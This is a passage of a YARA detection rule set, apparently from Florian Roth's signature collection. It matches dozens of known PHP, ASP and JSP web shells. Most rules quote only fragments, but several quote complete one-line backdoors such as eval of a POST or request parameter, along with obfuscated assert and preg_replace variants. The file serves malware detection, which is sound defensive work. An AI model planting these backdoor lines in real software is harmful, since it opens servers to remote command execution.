      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword
      $s2 = "Function MorfiCoder(Code)" fullword
      $s3 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)" fullword
   condition: 
      1 of them
}

rule Webshell_PHP_sql_RID2D3D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file sql.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:23:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_" 
      $s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&" 
   condition: 
      all of them
}

rule Webshell_iMHaPFtp_2_RID2E10 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file iMHaPFtp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:58:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "if ($l) echo '<a href=\"' . $self . '?action=permission&amp;file=' . urlencode($" 
      $s9 = "return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA" 
   condition: 
      1 of them
}

rule Webshell_phpshell_2_1_pwhash_RID3211 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file pwhash.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:49:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi" 
      $s3 = "word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\"," 
   condition: 
      1 of them
}

rule Webshell_PHPRemoteView_RID2F95 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file PHPRemoteView.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:03:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'" 
      $s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u" 
   condition: 
      1 of them
}

rule Webshell_caidao_shell_guo_RID3128 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file guo.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:10:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php ($www= $_POST['ice'])!" 
      $s1 = "@preg_replace('/ad/e','@'.str_rot13('riny').'($ww" 
   condition: 
      1 of them
}

rule Webshell_PHP_redcod_RID2E5E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file redcod.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:11:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw" fullword
      $s1 = "HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm" fullword
   condition: 
      all of them
}

rule Webshell_remview_fix_RID2F4B : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file remview_fix.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:51:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u" 
      $s5 = "echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n" 
   condition: 
      1 of them
}

rule Webshell_php_sh_server_RID301E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file server.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:26:11"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "eval(getenv('HTTP_CODE'));" fullword
   condition: 
      all of them
}

rule Webshell_PH_Vayv_PH_Vayv_RID303F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file PH Vayv.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:31:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in" 
      $s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style" 
   condition: 
      1 of them
}

rule Webshell_caidao_shell_ice_RID310E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ice.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:06:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%eval request(\"ice\")%>" fullword
   condition: 
      all of them
}

rule Webshell_cihshell_fix_RID2F98 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cihshell_fix.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:03:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty" 
      $s8 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos" 
   condition: 
      1 of them
}

rule Webshell_asp_shell_RID2E61 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file shell.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:12:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">" fullword
      $s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword
   condition: 
      all of them
}

rule Webshell_Private_i3lue_RID2FC2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Private-i3lue.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:10:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "case 15: $image .= \"\\21\\0\\" 
   condition: 
      all of them
}

rule Webshell_Mysql_interface_v1_0_RID3261 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Mysql interface v1.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:02:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return" 
   condition: 
      all of them
}

rule Webshell_php_s_u_RID2D94 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file s-u.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:37:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea" 
   condition: 
      all of them
}

rule Webshell_phpshell_2_1_config_RID31FC : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file config.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:45:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword
   condition: 
      all of them
}

rule Webshell_asp_EFSO_2_RID2E07 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file EFSO_2.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:57:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB" 
   condition: 
      all of them
}

rule Webshell_jsp_up_RID2D37 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file up.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:22:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "// BUG: Corta el fichero si es mayor de 640Ks" fullword
   condition: 
      all of them
}

rule Webshell_NetworkFileManagerPHP_A_RID3353 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file NetworkFileManagerPHP.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:43:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted " 
   condition: 
      all of them
}

rule Webshell_Server_Variables_RID3115 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Server Variables.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:07:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "<% For Each Vars In Request.ServerVariables %>" fullword
      $s9 = "Variable Name</B></font></p>" fullword
   condition: 
      all of them
}

rule Webshell_caidao_shell_ice_2_RID319F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ice.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:30:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php ${${eval($_POST[ice])}};?>" fullword
   condition: 
      all of them
}

rule Webshell_caidao_shell_mdb_RID3110 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file mdb.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:06:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<% execute request(\"ice\")%>a " fullword
   condition: 
      all of them
}

rule Webshell_jsp_guige_RID2E63 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file guige.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:12:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null" 
   condition: 
      all of them
}

rule Webshell_phpspy2010_RID2E0D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file phpspy2010.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:58:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "eval(gzinflate(base64_decode(" 
      $s5 = "//angel" fullword
      $s8 = "$admin['cookiedomain'] = '';" fullword
   condition: 
      all of them
}

rule Webshell_asp_ice_RID2D7A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ice.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:33:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC" 
   condition: 
      all of them
}

rule Webshell_drag_system_RID2F48 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file system.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:50:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_" 
   condition: 
      all of them
}

rule Webshell_DarkBlade1_3_asp_indexx_RID3355 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file indexx.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:43:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou" 
   condition: 
      all of them
}

rule Webshell_jsp_hsxa_RID2E06 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file hsxa.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:56:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja" 
   condition: 
      all of them
}

rule Webshell_jsp_utils_RID2E83 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file utils.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:17:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword
      $s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z" 
   condition: 
      all of them
}

rule Webshell_asp_01_RID2CAA : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 01.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:58:51"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%eval request(\"pass\")%>" fullword
   condition: 
      all of them
}

rule Webshell_asp_404_RID2CE1 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 404.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:08:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2" 
   condition: 
      all of them
}

rule Webshell_webshell_cnseay02_1_RID31D0 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file webshell-cnseay02-1.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:38:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU" 
   condition: 
      all of them
}

rule Webshell_php_fbi_RID2D7E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file fbi.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo" 
   condition: 
      all of them
}

rule Webshell_cmd_asp_5_1_RID2EA1 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cmd-asp-5.1.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:22:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
   condition: 
      all of them
}

rule Webshell_php_dodo_zip_RID2FA5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file zip.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:06:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x" 
      $s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" 
   condition: 
      all of them
}

rule Webshell_aZRaiLPhp_v1_0_RID2F86 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file aZRaiLPhp v1.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:00:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($" 
      $s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo" 
   condition: 
      all of them
}

rule Webshell_php_list_RID2E09 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file list.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:57:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "// list.php = Directory & File Listing" fullword
      $s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena" 
      $s9 = "// by: The Dark Raver" fullword
   condition: 
      1 of them
}

rule Webshell_ironshell_RID2E76 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ironshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:15:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\"" 
      $s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di" 
   condition: 
      all of them
}

rule Webshell_caidao_shell_404_RID3075 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 404.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:40:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St" 
   condition: 
      all of them
}

rule Webshell_ASP_aspydrv_RID2EF2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file aspydrv.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:36:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi" 
   condition: 
      all of them
}

rule Webshell_jsp_web_RID2D90 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file web.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:37:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request." 
   condition: 
      all of them
}

rule Webshell_mysqlwebsh_RID2EF5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file mysqlwebsh.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:36:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#" 
   condition: 
      all of them
}

rule Webshell_jspShell_1_RID2E7B : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file jspShell.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:16:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on" 
      $s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;" 
   condition: 
      all of them
}

rule Webshell_Dx_Dx_RID2C7D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Dx.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:51:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx" 
      $s9 = "class=linelisting><nobr>POST (php eval)</td><" 
   condition: 
      1 of them
}

rule Webshell_asp_ntdaddy_RID2F31 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ntdaddy.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:46:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "if  FP  =  \"RefreshFolder\"  or  " 
      $s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  " 
   condition: 
      1 of them
}

rule Webshell_MySQL_Web_Interface_Version_0_8_RID3634 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file MySQL Web Interface Version 0.8.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 16:45:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>" 
   condition: 
      all of them
}

rule Webshell_elmaliseker_2_RID2FC5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file elmaliseker.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:11:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx" 
      $s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but" 
   condition: 
      all of them
}

rule Webshell_ASP_RemExp_RID2E3A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file RemExp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:05:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques" 
      $s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal" 
   condition: 
      all of them
}

rule Webshell_jsp_list1_RID2E3F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file list1.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:06:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive" 
